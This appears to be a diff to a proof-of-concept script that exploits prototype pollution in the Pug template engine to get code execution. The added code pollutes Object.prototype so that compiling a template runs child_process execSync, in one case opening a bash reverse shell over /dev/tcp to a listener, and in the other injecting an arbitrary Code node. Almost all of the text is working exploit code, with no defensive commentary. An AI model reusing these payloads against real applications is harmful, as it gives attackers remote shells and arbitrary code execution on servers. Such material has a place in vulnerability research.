@@ -2,32 +2,46 @@ pug = require("pug")
 
 /* Payload Injection*/
 // inject property to root prototype
-Object.prototype.asString = '1';
-Object.prototype.name = '2';
-Object.prototype.inject = "},flag:process.mainModule.require(`child_process`).execSync(`touch ./attack.txt`).toString()}}//"
+
+// exp-1
+Object.prototype.block = {
+    type: "Text",
+    line: "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/127.0.0.1/8080 0>&1'`)"
+}
+
+// exp-2
+Object.prototype['attrs'] = [];
+Object.prototype['attributeBlocks'] = [];
+Object.prototype['block'] = 
+{ 
+  type: "Block",
+  nodes: [
+    {
+      type:"Tag",
+      name:"p",
+      block:{
+        type:"Block",
+        nodes:[
+          {
+            type:"Code",
+            val:"console.log('universal code injection!!!')",
+            block:{
+              type: "Block",
+              nodes:[
+                {
+                  type: "Comment",
+                  val: "End the visiting node process"
+                }
+              ]
+            }
+          },
+        ],
+      },
+    },
+  ]}
+
+
 
 const template = pug.compile(`h1= msg`);
 
 console.log(template.toString());
-
-
-
-
-// currProp = 'block';
-// Object.defineProperty(
-//     Object.prototype, 
-//     currProp, { 
-//       get: function() { 
-//         if(this[currProp + "cs"]){
-//             return this[currProp + "cs"]; 
-//         }
-//         else{
-//             console.log("block has been visited!");
-//         }
-//         return undefined; 
-//       }, 
-//       set: function(val){ 
-//         this[currProp + "cs"] = val;
-//       } 
-//     }
-//   );
